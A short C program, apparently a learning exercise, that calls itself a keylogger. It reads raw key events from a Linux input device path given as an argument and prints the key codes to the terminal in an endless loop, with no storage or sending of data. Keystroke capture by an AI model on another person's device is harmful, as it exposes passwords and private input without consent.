#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include <errno.h>
#include <unistd.h>
int main(int argc , char *argv[]){
  // char* file_path[]={"/dev/input/by-path/platform-i8042-serio-0-event-kbd"};
  // int a=0;
  // a=open(*file_path,O_RDONLY,0);
  // printf("Status of reading the file : %d\n",a);
  if(argc!=2){
    printf("Usage: %s event file path \n",argv[0]);
    exit(-1);
  }
  printf("Keylogger Active ... \n");

  // if(a==AT_EACCESS){
  //   printf("Access is not allowed \n");
  // }
  // if(a<0){
  //   printf("Issue in reading the file \n");
  //   return -1;
  // }
  int fd=open(argv[1],O_RDONLY,0);
  printf("File descriptor value : %d\n",fd);
  struct input_event ie;

  // printf("Error : %d\n",errno);
  printf("Value produces : %d\n",ie.code);
  while(1){
    read(fd , &ie , sizeof(ie));
    printf("Value profuces : %d\n",ie.code);
    
  }
  // read(fd , &ie , sizeof(ie));
  // printf("Value profuces : %d\n",ie.code);
  // read(fd , &ie , sizeof(ie));
  // printf("Value profuces : %d\n",ie.code);

  
  // if(n==-1){
  //   printf("Error\n");
  //   exit(-1);
  // }




}
